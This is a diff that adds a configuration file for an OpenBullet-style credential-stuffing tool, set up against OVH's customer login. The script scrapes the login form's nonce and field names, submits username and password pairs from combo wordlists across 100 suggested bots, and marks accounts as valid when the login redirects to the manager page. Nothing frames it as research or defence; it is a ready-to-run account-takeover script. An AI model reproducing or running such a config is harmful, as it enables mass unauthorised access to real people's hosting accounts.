@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "OVH",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-07T16:18:46.4746841+07:00",
+  "AdditionalInfo": "the person who made this is 100% not gay",
+  "Author": "WhyMeGodWhy",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.ovh.com/auth/?action=gotomanager&from=https://www.ovh.com/fr/&ovhSubsidiary=fr" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#nonce PARSE "<SOURCE>" LR "name=\"nonce\" value=\"" "\">" Recursive=FALSE -> VAR "nonce" "" "" 
+#duration PARSE "<SOURCE>" LR "name=\"duration\" value=\"" "\"" Recursive=FALSE -> VAR "duration" "" "" 
+#passs PARSE "<SOURCE>" LR "input type=\"password\" id=\"" "\"" Recursive=FALSE -> VAR "passs" "" "" 
+#use PARSE "<SOURCE>" LR "<input type=\"text\" id=\"" "\" placeholder=" Recursive=FALSE -> VAR "use" "" "" 
+REQUEST POST "https://www.ovh.com/auth/?action=gotomanager&from=https://www.ovh.com/fr/&ovhSubsidiary=fr" AutoRedirect=TRUE 
+  CONTENT "credentialToken=&nonce=<nonce>&sT=&<use>=<USER>&<passs>=<PASS>&jsE=ok&duration=<duration>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Account ID or password" 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "manager/web/index.html" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "name=\"emailCodeSubmit\">" 
